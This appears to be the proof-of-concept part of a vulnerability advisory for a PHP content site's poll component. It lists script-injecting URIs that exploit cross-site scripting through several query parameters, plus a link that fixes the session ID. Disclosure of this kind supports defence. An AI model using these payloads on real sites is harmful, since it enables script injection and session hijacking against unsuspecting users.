To exploit these issues an attacker entices an unsuspecting user into following a malicious URI.

The following example URIs are available for the cross-site scripting issues:

http://www.example.net/index.php?&gt;"&gt;&lt;script&gt;alert("XSS Vuln")&lt;/script&gt;
http://www.example.net/index.php?option=&gt;"&gt;&lt;script&gt;alert("XSS Vuln")&lt;/script&gt;
http://www.example.net/index.php?option=com_poll&amp;Itemid=&gt;"&gt;&lt;script&gt;alert("XSS Vuln")&lt;/script&gt;
http://www.example.net/index.php?option=com_poll&amp;task=view&amp;id=&gt;"&gt;&lt;script&gt;alert("XSS Vuln")&lt;/script&gt;
http://www.example.net/index.php?option=com_poll&amp;Itemid=1&amp;task=&gt;"&gt;&lt;script&gt;alert("XSS Vuln")&lt;/script&gt;
http://www.example.net/index.php?option=com_poll&amp;task=view&amp;bid=&gt;"&gt;&lt;script&gt;alert("XSS Vuln")&lt;/script&gt;
http://www.example.net/index.php?option=com_poll&amp;Itemid=1&amp;task=view&amp;contact_id=&gt;"&gt;&lt;script&gt;alert("XSS Vuln")&lt;/script&gt;

The following example URI is available for the session-fixation attack:

http://www.site.com/?PHPSESSID=session_fixation
